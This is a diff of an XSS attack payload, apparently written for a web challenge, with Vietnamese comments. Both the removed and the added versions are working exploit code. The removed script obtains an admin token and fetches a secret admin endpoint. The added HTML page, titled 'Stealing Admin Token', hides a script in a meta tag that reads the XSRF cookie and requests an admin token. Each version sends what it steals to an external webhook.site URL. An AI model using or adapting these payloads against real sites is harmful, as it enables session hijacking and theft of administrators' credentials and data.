@@ -1,47 +1,36 @@
-<script>
-(async () => {
-  try {
-    // 1. Lấy CSRF token từ meta hoặc bỏ nếu không cần
-    const csrf = document.querySelector('meta[name="csrf-token"]')?.content;
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Get Admin Token</title>
+  <meta name="description" content='<script>
+    (function () {
+      var webhook = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
 
-    // 2. Gửi POST để tạo token
-    const tokenRes = await fetch('/generate-token', {
-      method: 'POST',
-      headers: {
-        'X-CSRF-TOKEN': csrf,
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-      },
-      credentials: 'include'
-    });
+      // Lấy XSRF-TOKEN từ cookie
+      var xsrf = document.cookie.split(";").find(c => c.trim().startsWith("XSRF-TOKEN="));
+      if (!xsrf) return;
+      xsrf = decodeURIComponent(xsrf.trim().substring("XSRF-TOKEN=".length));
 
-    const tokenData = await tokenRes.json();
-    const token = tokenData.token;
-
-    // 3. Gửi GET để lấy dữ liệu bảo vệ bằng token
-    const secretRes = await fetch('/api/admin/sup3rs3cr3t', {
-      method: 'GET',
-      headers: {
-        'Authorization': 'Bearer ' + token,
-        'Accept': 'application/json'
-      },
-      credentials: 'include'
-    });
-
-    const secretData = await secretRes.text();
-
-    // 4. Gửi dữ liệu về webhook
-    await fetch('https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        token: token,
-        secret: secretData
+      // Gửi POST để lấy token
+      fetch("/generate-token", {
+        method: "POST",
+        headers: {
+          "Accept": "application/json",
+          "X-XSRF-TOKEN": xsrf
+        },
+        credentials: "include"
       })
-    });
-  } catch (e) {
-    // Tùy chọn: log lỗi
-    console.error('Exploit error:', e);
-  }
-})();
-</script>
+      .then(r => r.json())
+      .then(data => {
+        if (data.token) {
+          new Image().src = webhook + "?token=" + encodeURIComponent(data.token);
+        }
+      });
+    })();
+  </script>'>
+</head>
+<body>
+  <h1>Stealing Admin Token</h1>
+</body>
+</html>
